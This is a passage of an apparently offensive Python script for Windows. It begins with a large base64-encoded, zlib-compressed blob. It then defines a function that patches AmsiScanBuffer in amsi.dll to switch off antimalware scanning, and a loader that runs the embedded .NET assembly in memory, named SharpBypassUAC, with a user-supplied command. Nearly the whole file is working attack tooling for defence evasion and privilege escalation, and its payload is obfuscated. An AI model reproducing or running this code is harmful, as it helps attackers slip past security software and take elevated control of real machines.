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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpBypassUAC.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()